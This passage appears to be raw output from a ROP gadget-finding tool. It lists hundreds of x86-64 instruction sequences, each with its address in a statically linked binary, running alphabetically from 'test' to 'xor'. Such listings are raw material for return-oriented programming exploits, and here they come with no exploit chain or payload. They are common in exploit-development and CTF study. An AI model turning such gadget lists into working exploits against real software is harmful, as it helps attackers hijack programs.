0x000000000048bc3f : test rax, rax ; je 0x48bc59 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000497950 : test rax, rax ; je 0x497961 ; call rax
0x000000000041de4b : test rax, rax ; jne 0x41de46 ; ret
0x000000000041ede3 : test rax, rax ; jne 0x41edde ; ret
0x00000000004511b8 : test rbp, rbp ; jne 0x4511d9 ; mov rdi, qword ptr [rbx] ; call r12
0x0000000000451d23 : test rbp, rbp ; jne 0x451d51 ; mov rdi, qword ptr [rbx] ; call r12
0x0000000000496e20 : test rbp, rbp ; jne 0x496e11 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004979da : test rbp, rbp ; jne 0x4979c9 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000485fc9 : test rdi, rdi ; jne 0x485fa6 ; ret
0x00000000004474ea : test rdx, rdx ; je 0x447508 ; bsf rax, rdx ; ret
0x00000000004474ea : test rdx, rdx ; je 0x447509 ; bsf rax, rdx ; ret
0x000000000047a409 : test rdx, rdx ; je 0x47a438 ; bsf rax, rdx ; ret
0x000000000047a409 : test rdx, rdx ; je 0x47a439 ; bsf rax, rdx ; ret
0x000000000041b292 : test rdx, rdx ; jne 0x41b2a6 ; ret
0x000000000041cf2e : test rdx, rdx ; jne 0x41cf26 ; ret
0x00000000004775fe : test rdx, rdx ; jne 0x4775f6 ; ret
0x000000000045fcc7 : test rsi, rsi ; je 0x45fcd3 ; call rsi
0x000000000047a300 : test rsi, rsi ; jne 0x47a311 ; xor rax, rax ; ret
0x000000000047afc0 : test rsi, rsi ; jne 0x47afd1 ; xor rax, rax ; ret
0x000000000041bfe3 : vminsd xmm8, xmm4, qword ptr [rcx + 0x5c] ; ret
0x000000000043effa : vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x000000000044ddac : vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x000000000044d775 : vmovdqu xmmword ptr [rdi], xmm0 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x000000000044e931 : vmovdqu xmmword ptr [rdi], xmm0 ; vzeroupper ; ret
0x000000000044d779 : vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x000000000044df38 : vmovdqu ymmword ptr [r11], ymm4 ; vzeroupper ; ret
0x000000000044dfdf : vmovdqu ymmword ptr [r11], ymm8 ; vzeroupper ; ret
0x000000000043efe6 : vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x000000000043efcd : vmovdqu ymmword ptr [r9 - 0x20], ymm3 ; ret
0x000000000044dd15 : vmovdqu ymmword ptr [rdi + rdx - 0x20], ymm1 ; vzeroupper ; ret
0x000000000044e89b : vmovdqu ymmword ptr [rdi + rdx - 0x40], ymm0 ; vzeroupper ; ret
0x000000000044de83 : vmovdqu ymmword ptr [rdi + rdx - 0x40], ymm3 ; vzeroupper ; ret
0x000000000044de55 : vmovdqu ymmword ptr [rdi + rdx - 0x80], ymm7 ; vzeroupper ; ret
0x000000000044e822 : vmovdqu ymmword ptr [rdi], ymm0 ; vzeroupper ; ret
0x000000000044d76b : vmovdqu ymmword ptr [rdi], ymm2 ; vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x000000000044d76f : vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x000000000044e3f2 : vmovdqu64 zmmword ptr [r11], zmm4 ; vzeroupper ; ret
0x000000000044e4b8 : vmovdqu64 zmmword ptr [r11], zmm8 ; vzeroupper ; ret
0x000000000044e9ad : vmovdqu64 zmmword ptr [rdi], zmm0 ; vzeroupper ; ret
0x000000000044d784 : vmovq qword ptr [rdi], xmm0 ; vmovq qword ptr [rsi - 8], xmm0 ; ret
0x000000000044d788 : vmovq qword ptr [rsi - 8], xmm0 ; ret
0x000000000043f303 : vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x000000000043f19c : vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x000000000043ef9e : vmovups zmmword ptr [r9 - 0x40], zmm3 ; ret
0x000000000043ef62 : vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x000000000043f465 : vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x000000000044d928 : vmovups zmmword ptr [rsi + 0x1c0], zmm2 ; ret
0x000000000044d88b : vmovups zmmword ptr [rsi + 0xc0], zmm2 ; ret
0x000000000044d72a : vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x0000000000445641 : vpcmpeqb xmm0, xmm0, xmm1 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x0000000000432178 : vzeroupper ; ret
0x0000000000432350 : vzeroupper ; xor eax, eax ; ret
0x000000000049b4ed : wait ; stc ; jmp rax
0x00000000004311c3 : xchg ah, bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004448ef : xchg ah, bl ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004312b3 : xchg ah, ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004310d3 : xchg ah, cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000466d42 : xchg al, bl ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000044653c : xchg bh, bh ; add eax, 0x83480000 ; ret 0x4910
0x0000000000445d5c : xchg bh, bl ; or eax, 0x83480000 ; ret 0x4910
0x000000000044614c : xchg bh, ch ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044596c : xchg bh, cl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004843cc : xchg bh, cl ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000044ebb2 : xchg byte ptr [rax + 1], cl ; int1 ; jmp rcx
0x0000000000431b1b : xchg byte ptr [rax + rax - 0x7cb80000], al ; ret 0xeb10
0x000000000044544f : xchg byte ptr [rax + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000444c2f : xchg byte ptr [rax + rcx - 0x7cb80000], bl ; ret 0xe910
0x000000000044440f : xchg byte ptr [rax + rdx - 0x7cb80000], bh ; ret 0xe910
0x0000000000455c28 : xchg byte ptr [rax - 0x75], cl ; ret
0x0000000000431673 : xchg byte ptr [rax - 0x7cb80000], ch ; ret 0xeb10
0x0000000000445b0b : xchg byte ptr [rax], dh ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000444f6f : xchg byte ptr [rbp + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000430e03 : xchg byte ptr [rbp + rcx - 0x7cb80000], bl ; ret 0xeb10
0x000000000044474f : xchg byte ptr [rbp + rcx], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000443f2f : xchg byte ptr [rbp + rdx - 0x7cb80000], bl ; ret 0xe910
0x000000000044510f : xchg byte ptr [rbx + rax - 0x7cb80000], bh ; ret 0xe910
0x0000000000431853 : xchg byte ptr [rbx + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000430fe3 : xchg byte ptr [rbx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x000000000049356c : xchg byte ptr [rcx + rax - 0x10], cl ; jmp rax
0x0000000000431a33 : xchg byte ptr [rcx + rax], ch ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000049bc5c : xchg byte ptr [rcx], dh ; cli ; call qword ptr [rsi]
0x0000000000445ffc : xchg byte ptr [rdi], bh ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044581c : xchg byte ptr [rdi], bl ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044692c : xchg byte ptr [rdi], cl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000045ae63 : xchg byte ptr [rdi], dl ; or eax, 0xea810000 ; ret 0
0x0000000000431943 : xchg byte ptr [rdx + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000044426f : xchg byte ptr [rdx + rdx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000431285 : xchg byte ptr [rdx], bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000431375 : xchg byte ptr [rdx], ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000049b764 : xchg byte ptr [rdx], cl ; cli ; call qword ptr [rsi]
0x0000000000431195 : xchg byte ptr [rdx], cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000421785 : xchg byte ptr [rsi - 0x9fffffd], dh ; ret 0xf08
0x00000000004443a5 : xchg byte ptr [rsi], ah ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004450a5 : xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000444bc5 : xchg byte ptr [rsi], al ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000445efd : xchg byte ptr [rsi], bh ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000045bf55 : xchg byte ptr [rsi], bl ; add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x000000000044682d : xchg byte ptr [rsi], cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000430ef3 : xchg byte ptr [rsp + rcx - 0x7cb80000], ch ; ret 0xeb10
0x00000000004b33dd : xchg ch, dh ; call rsp
0x000000000049b271 : xchg cl, bh ; inc dword ptr [rdx] ; xchg ecx, edi ; call rdx
0x000000000049b281 : xchg cl, bh ; jmp qword ptr [rax]
0x00000000004453e5 : xchg dh, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004446e5 : xchg dh, ah ; or eax, 0x83480000 ; ret 0x4910
0x0000000000444205 : xchg dh, al ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000444f05 : xchg dh, al ; add eax, 0x83480000 ; ret 0x4910
0x000000000044604d : xchg dh, ch ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000044586d : xchg dh, cl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004310a5 : xchg dl, bh ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430ec5 : xchg dl, bl ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430fb5 : xchg dl, ch ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430dd5 : xchg dl, cl ; or eax, 0x83480000 ; ret 0x4910
0x0000000000475d19 : xchg dword ptr [rax + 1], ecx ; clc ; jmp rax
0x00000000004733e0 : xchg dword ptr [rax - 0x76ffffe3], edi ; ret 0x349
0x0000000000409643 : xchg dword ptr [rax - 0x7d], ecx ; ret
0x0000000000482266 : xchg dword ptr [rax], eax ; add eax, dword ptr [rax] ; add bl, dh ; ret
0x0000000000455d14 : xchg dword ptr [rbp + rcx*4 + 0x34], ecx ; ret
0x000000000046987b : xchg dword ptr [rbp - 0x77000000], eax ; ret 0x349
0x0000000000472a92 : xchg dword ptr [rbx - 0x76ffffdb], edi ; ret 0x349
0x00000000004adb4c : xchg dword ptr [rcx + 0x79], ecx ; xchg eax, edx ; ret 0xf869
0x0000000000491c1a : xchg dword ptr [rcx + rax - 8], ecx ; jmp rax
0x0000000000473a8a : xchg dword ptr [rcx - 0x76ffffea], ecx ; ret 0x349
0x00000000004746d5 : xchg dword ptr [rcx - 0x76fffff6], esp ; ret 0x349
0x00000000004746ac : xchg dword ptr [rdi - 0x76fffff6], edx ; ret 0x349
0x000000000045284e : xchg dword ptr [rdi], eax ; test eax, eax ; jne 0x45284d ; pop rdx ; pop r10 ; ret
0x0000000000475f04 : xchg dword ptr [rdi], esi ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x8b08
0x000000000047059a : xchg dword ptr [rdx + rbx], esp ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000407015 : xchg dword ptr [rip + 0x2141f4d5], ecx ; ret
0x000000000047f8b0 : xchg dword ptr [rip - 0x76fffffd], edx ; ret 0xe8c0
0x0000000000472544 : xchg dword ptr [rsi - 0x76ffffd5], edi ; ret 0x349
0x0000000000468728 : xchg dword ptr [rsi - 0x76ffffef], eax ; ret 0x349
0x0000000000468c40 : xchg dword ptr [rsi - 0x76fffff5], edi ; ret 0x349
0x00000000004751c3 : xchg dword ptr [rsi - 0x77000000], edx ; ret 0x349
0x00000000004adceb : xchg dword ptr [rsp + rax + 0x6fa9ce9d], esp ; ret
0x000000000045f22b : xchg eax, ebp ; push 0x4cffffff ; mov edi, esi ; call rdx
0x000000000045693f : xchg eax, ebp ; ret
0x0000000000491800 : xchg eax, ebp ; ret 0x145
0x000000000047e8ea : xchg eax, ebp ; ret 0x2041
0x000000000047e9aa : xchg eax, ebp ; ret 0x2044
0x00000000004019d2 : xchg eax, ebp ; ret 0x2948
0x00000000004508ec : xchg eax, ebp ; ret 0x3948
0x00000000004247db : xchg eax, ebp ; ret 0x8348
0x0000000000480570 : xchg eax, ebp ; ret 0xc283
0x000000000042799d : xchg eax, ebp ; ret 0xd020
0x0000000000414845 : xchg eax, ebp ; ret 0xd021
0x000000000046ae2a : xchg eax, ebp ; ret 0xd120
0x0000000000416962 : xchg eax, ebp ; ret 0xdaf7
0x0000000000454001 : xchg eax, ebp ; ret 0xe1eb
0x000000000049337a : xchg eax, ebp ; ret 0xf45
0x000000000041f2ad : xchg eax, ebp ; sal bh, 0xd8 ; ret
0x000000000049b519 : xchg eax, ebp ; stc ; inc eax ; xchg eax, esi ; stc ; call qword ptr [rax]
0x0000000000417cd2 : xchg eax, ebx ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x294c
0x0000000000472607 : xchg eax, ebx ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x00000000004bbd3d : xchg eax, ebx ; add byte ptr [rax], al ; rcr ch, 1 ; cld ; jmp qword ptr [rcx]
0x0000000000432d00 : xchg eax, ebx ; add rcx, r11 ; jmp rcx
0x0000000000467989 : xchg eax, ebx ; jno 0x4679b9 ; add byte ptr [rax - 0x75], cl ; add al, 0xf8 ; jmp rax
0x000000000044aadc : xchg eax, ebx ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00000000004344a2 : xchg eax, ebx ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x0000000000461e08 : xchg eax, ebx ; ret 0x3948
0x0000000000418acc : xchg eax, ebx ; ret 0x3949
0x00000000004270f0 : xchg eax, ebx ; ret 0x3d83
0x0000000000477ea5 : xchg eax, ebx ; ret 0x840
0x00000000004628ed : xchg eax, ebx ; ret 0x854d
0x0000000000423a89 : xchg eax, ebx ; ret 0xffff
0x00000000004454f1 : xchg eax, ecx ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x000000000046805b : xchg eax, ecx ; ret 0xffff
0x000000000049b511 : xchg eax, ecx ; stc ; jmp qword ptr [rax]
0x0000000000443c1f : xchg eax, ecx ; sub eax, edx ; ret
0x0000000000416a62 : xchg eax, ecx ; xor byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x000000000049c944 : xchg eax, ecx ; xor eax, 0x3591fffb ; sti ; jmp rdx
0x000000000041b304 : xchg eax, edi ; add byte ptr [rax], 0 ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x0000000000413be1 : xchg eax, edi ; add rdx, rdi ; jmp rdx
0x000000000042b225 : xchg eax, edi ; out 0, al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000042591b : xchg eax, edi ; ret 0x394c
0x00000000004005be : xchg eax, edi ; ret 0xda80
0x0000000000425e01 : xchg eax, edi ; ret 0xfae9
0x00000000004263e9 : xchg eax, edi ; ret 0xfbe9
0x00000000004ae198 : xchg eax, edi ; xchg eax, esp ; ret
0x0000000000481b5f : xchg eax, edx ; add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret 0xed75
0x00000000004afa5d : xchg eax, edx ; jae 0x4afa3a ; push rsi ; pop rdx ; je 0x4afa2f ; ret 0xacfc
0x000000000049b7ec : xchg eax, edx ; or edx, edi ; jmp qword ptr [rdx]
0x000000000040c578 : xchg eax, edx ; ret 0x8548
0x0000000000489cb5 : xchg eax, edx ; ret 0x8949
0x00000000004adb4f : xchg eax, edx ; ret 0xf869
0x000000000044d64d : xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x0000000000431b7c : xchg eax, edx ; sub eax, edx ; ret
0x000000000049bce4 : xchg eax, edx ; xor dl, bh ; jmp qword ptr [rdx]
0x0000000000433000 : xchg eax, esi ; add byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000043b233 : xchg eax, esi ; add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x00000000004bc06d : xchg eax, esi ; add byte ptr [rax], al ; push rax ; stc ; cld ; jmp qword ptr [rdx]
0x000000000045cc71 : xchg eax, esi ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4804
0x000000000044ec44 : xchg eax, esi ; add rax, rsi ; jmp rax
0x00000000004330bd : xchg eax, esi ; lock add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000043301b : xchg eax, esi ; nop ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000044f8a1 : xchg eax, esi ; ret 0xc085
0x00000000004b03ec : xchg eax, esi ; ret 0xcd11
0x000000000044f8ff : xchg eax, esi ; ret 0xd284
0x000000000043306c : xchg eax, esi ; rol byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000049b51d : xchg eax, esi ; stc ; call qword ptr [rax]
0x000000000047a8c6 : xchg eax, esi ; std ; dec dword ptr [rax + 0xf] ; ret 0x90c3
0x0000000000407406 : xchg eax, esp ; adc ah, al ; out 0x2c, al ; inc byte ptr [rcx + 9] ; ret
0x0000000000473427 : xchg eax, esp ; add byte ptr [rax], al ; add byte ptr [rcx + 0x63], cl ; ret 0x8948
0x00000000004b8bac : xchg eax, esp ; cli ; call qword ptr [rdx]
0x000000000049c24d : xchg eax, esp ; cli ; call rax
0x00000000004b3581 : xchg eax, esp ; cmc ; jmp qword ptr [rax]
0x0000000000473588 : xchg eax, esp ; mov esp, 0x8b480024 ; add al, 0xf8 ; jmp rax
0x00000000004b05ff : xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x4b0590 ; ret 0x48f
0x000000000046d282 : xchg eax, esp ; ret
0x0000000000457a3b : xchg eax, esp ; ret 0x1f0f
0x00000000004509bb : xchg eax, esp ; ret 0x2044
0x0000000000487c1c : xchg eax, esp ; ret 0x3d
0x000000000042344e : xchg eax, esp ; ret 0x3de9
0x00000000004745b7 : xchg eax, esp ; ret 0x7f3c
0x000000000048b881 : xchg eax, esp ; ret 0x950f
0x0000000000409594 : xchg eax, esp ; ret 0xb60f
0x000000000044d650 : xchg eax, esp ; ret 0xc085
0x0000000000450ce1 : xchg eax, esp ; ret 0xc221
0x000000000047d445 : xchg eax, esp ; ret 0xc283
0x00000000004507f8 : xchg eax, esp ; ret 0xca21
0x0000000000407b73 : xchg eax, esp ; ret 0xd284
0x0000000000456466 : xchg eax, esp ; ret 0xd5e9
0x0000000000416fcd : xchg eax, esp ; ret 0xdaf7
0x000000000049331b : xchg eax, esp ; ret 0xf45
0x000000000042989a : xchg eax, esp ; ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x73], 0x44 ; ret 0xfff
0x00000000004bd4e9 : xchg eax, esp ; std ; jmp qword ptr [rax]
0x00000000004891aa : xchg ebp, edi ; inc dword ptr [rbp - 0x76b08a40] ; ret
0x000000000049b285 : xchg ecx, edi ; call qword ptr [rax]
0x000000000049b275 : xchg ecx, edi ; call rdx
0x0000000000421854 : xchg edi, esp ; add al, byte ptr [rax] ; add dh, dh ; ret
0x000000000049c1e1 : xchg edx, edi ; call qword ptr [rax]
0x0000000000405d46 : xlatb ; add al, ah ; ret
0x00000000004a91d9 : xlatb ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x0000000000434369 : xlatb ; add r9, r11 ; jmp r9
0x000000000047c54f : xlatb ; ja 0x47c57c ; ret
0x000000000044d9b3 : xlatb ; jb 0x44d9be ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000413ecd : xlatb ; jmp rdi
0x00000000004aebc3 : xlatb ; jo 0x4aec3f ; mov ebp, 0xfb67d10d ; ret
0x000000000048b3a2 : xlatb ; mov byte ptr [rsi], al ; jne 0x48b388 ; mov rax, rsi ; ret
0x0000000000431ca4 : xlatb ; ret
0x00000000004b0066 : xlatb ; ret 0x4e27
0x000000000047a007 : xlatb ; ret 0x94c
0x0000000000431c8f : xlatb ; ret 0xc085
0x000000000042c7b0 : xlatb ; ret 0xc148
0x0000000000432914 : xlatb ; ret 0xe883
0x0000000000447464 : xlatb ; ret 0xf66
0x0000000000432ad8 : xlatb ; ret 0xff2d
0x0000000000432071 : xlatb ; rol byte ptr [rbp + 0x664975c0], 0xf ; xlatb ; ret 0xc085
0x000000000047a1b5 : xlatb ; rol ch, cl ; std ; xlatb ; ret
0x0000000000431e53 : xlatb ; rol dword ptr [rbp + 0x315775c0], -0x40 ; ret
0x0000000000432392 : xlatb ; rol dword ptr [rbp - 0x3a378a40], -3 ; xlatb ; ret 0xc085
0x00000000004471e2 : xlatb ; rol dword ptr [rbp - 0x3a678a40], -3 ; xlatb ; ret 0xc085
0x000000000044b606 : xlatb ; ror dword ptr [rcx], cl ; ret 0xe074
0x000000000042c696 : xlatb ; sal bh, 1 ; ret 0x8000
0x000000000042c556 : xlatb ; sal bh, 1 ; ret 0xc000
0x000000000042c416 : xlatb ; sal bh, 1 ; ret 0xe000
0x000000000042c2d6 : xlatb ; sal bh, 1 ; ret 0xf000
0x000000000042c196 : xlatb ; sal bh, 1 ; ret 0xf800
0x000000000042c056 : xlatb ; sal bh, 1 ; ret 0xfc00
0x000000000042bf16 : xlatb ; sal bh, 1 ; ret 0xfe00
0x000000000042bdd6 : xlatb ; sal bh, 1 ; ret 0xff00
0x000000000042bc96 : xlatb ; sal bh, 1 ; ret 0xff80
0x000000000042bb56 : xlatb ; sal bh, 1 ; ret 0xffc0
0x000000000042ba16 : xlatb ; sal bh, 1 ; ret 0xffe0
0x000000000042b8d6 : xlatb ; sal bh, 1 ; ret 0xfff0
0x000000000042b796 : xlatb ; sal bh, 1 ; ret 0xfff8
0x000000000042b656 : xlatb ; sal bh, 1 ; ret 0xfffc
0x000000000042b516 : xlatb ; sal bh, 1 ; ret 0xfffe
0x000000000041fb55 : xlatb ; sbb al, 0x2a ; add bl, dh ; ret
0x000000000044b602 : xlatb ; shl byte ptr [rsi + 0xf], 0xd7 ; ror dword ptr [rcx], cl ; ret 0xe074
0x0000000000479fa5 : xlatb ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x0000000000479fb6 : xlatb ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret 0xf66
0x000000000049b5fd : xlatb ; stc ; call qword ptr [rax]
0x000000000049b5dd : xlatb ; stc ; inc dword ptr [rax - 0x27] ; stc ; jmp qword ptr [rax]
0x000000000042b20a : xor ah, byte ptr [rdi] ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x000000000049b678 : xor ah, dl ; stc ; call qword ptr [rax]
0x00000000004adb4a : xor al, 0x19 ; xchg dword ptr [rcx + 0x79], ecx ; xchg eax, edx ; ret 0xf869
0x0000000000460ac2 : xor al, 0x88 ; add rsi, r8 ; jmp rsi
0x00000000004b923c : xor al, 0xa4 ; cli ; call qword ptr [rdx]
0x0000000000475b5b : xor al, 0xbe ; add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x00000000004948b2 : xor al, 0xcb ; mov rsi, qword ptr [r14] ; call r12
0x00000000004aed2a : xor al, 0xd8 ; ret
0x000000000045fcc5 : xor al, 0xf0 ; test rsi, rsi ; je 0x45fcd5 ; call rsi
0x000000000045983e : xor al, 0xf6 ; ret
0x000000000049b1a1 : xor bh, cl ; jmp qword ptr [rax + 0x20fff933]
0x000000000049bc15 : xor bh, dl ; call qword ptr [rax]
0x000000000049bcd5 : xor bh, dl ; jmp rdx
0x000000000049b5fc : xor bh, dl ; stc ; call qword ptr [rax]
0x0000000000431edc : xor bl, al ; nop ; xor eax, eax ; ret
0x000000000049bb50 : xor bl, bh ; stc ; call rax
0x000000000049b614 : xor bl, dl ; stc ; call qword ptr [rax]
0x0000000000431dad : xor byte ptr [r14 + 0xf], r12b ; xlatb ; ret
0x0000000000417f32 : xor byte ptr [r8 + 1], r9b ; ret 0x8b49
0x0000000000462568 : xor byte ptr [rax + 0x39], cl ; ret 0x8d48
0x0000000000446c11 : xor byte ptr [rax + 0xf], cl ; ret 0x90c3
0x0000000000447072 : xor byte ptr [rax + 0xf], cl ; ret 0xf8c5
0x0000000000417f33 : xor byte ptr [rax + 1], cl ; ret 0x8b49
0x00000000004516fa : xor byte ptr [rax - 0x75], cl ; jge 0x4516b0 ; mov r12d, r14d ; call r15
0x00000000004477cf : xor byte ptr [rax - 0x77], cl ; add cl, byte ptr [rax - 0x7d] ; ret 0x4808
0x000000000047ad3f : xor byte ptr [rax - 0x77], cl ; out dx, eax ; call rbx
0x0000000000491768 : xor byte ptr [rax - 0x77], cl ; ret 0x2148
0x00000000004785e2 : xor byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rax - 0xa] ; ret 0x7408
0x0000000000453dcf : xor byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000409878 : xor byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00000000004b7190 : xor byte ptr [rax - 7], bh ; call qword ptr [rbx]
0x00000000004b6a50 : xor byte ptr [rax - 9], cl ; jmp qword ptr [rbx]
0x000000000041828b : xor byte ptr [rax], 1 ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00000000004152f9 : xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x0000000000415233 : xor byte ptr [rax], al ; add byte ptr [rax], al ; call rdx
0x000000000047af8c : xor byte ptr [rax], al ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x000000000041531f : xor byte ptr [rax], al ; add byte ptr [rax], al ; mov rdi, qword ptr [rax + 0x20] ; call rdx
0x000000000044ec93 : xor byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000047851a : xor byte ptr [rax], al ; je 0x478525 ; ret
0x0000000000494cce : xor byte ptr [rbp + 0x27], dh ; mov rax, qword ptr [rsi + 0x10] ; ret
0x000000000044dc05 : xor byte ptr [rbp + 0xf], al ; adc dword ptr [rbx], eax ; ret
0x00000000004070b7 : xor byte ptr [rbp + 9], al ; fadd qword ptr [rcx - 0x77] ; ret
0x000000000049c228 : xor byte ptr [rbp - 0x617f0006], bl ; cli ; call rax
0x000000000046d489 : xor byte ptr [rbx + 0x291c2454], cl ; ret 0xe683
0x000000000041b616 : xor byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000004561ba : xor byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00000000004744eb : xor byte ptr [rbx - 0x78f0f608], al ; ret
0x0000000000491585 : xor byte ptr [rcx + 0x21], cl ; ror byte ptr [rax + 0x21], cl ; ret 0xc148
0x000000000047f1c3 : xor byte ptr [rcx + 0x29], cl ; ret
0x0000000000406dfb : xor byte ptr [rcx + 0x31], al ; ret
0x000000000049b6d4 : xor byte ptr [rcx + rdi*8 - 0x6427f01], bh ; call rax
0x000000000049b214 : xor byte ptr [rcx + rdi*8 - 1], bl ; and byte ptr [rbp - 7], bl ; call qword ptr [rax]
0x000000000049b420 : xor byte ptr [rcx - 0x4cef0007], dh ; stc ; call qword ptr [rax]
0x000000000041828c : xor byte ptr [rcx], al ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x0000000000419577 : xor byte ptr [rcx], al ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000416a63 : xor byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x000000000049b690 : xor byte ptr [rdi - 0x443f0007], 0xf9 ; call qword ptr [rax]
0x00000000004776c0 : xor byte ptr [rdi], cl ; ret 0x4389
0x00000000004bb42c : xor byte ptr [rdx + 0x514a0000], cl ; hlt ; jmp qword ptr [rcx]
0x0000000000419373 : xor byte ptr [rdx + rbp], bh ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x000000000049bc14 : xor byte ptr [rdx], 0xfa ; call qword ptr [rax]
0x00000000004b7dc7 : xor byte ptr [rsi + 0x380e4106], al ; add dword ptr [rdi], 3 ; ret 0xa01
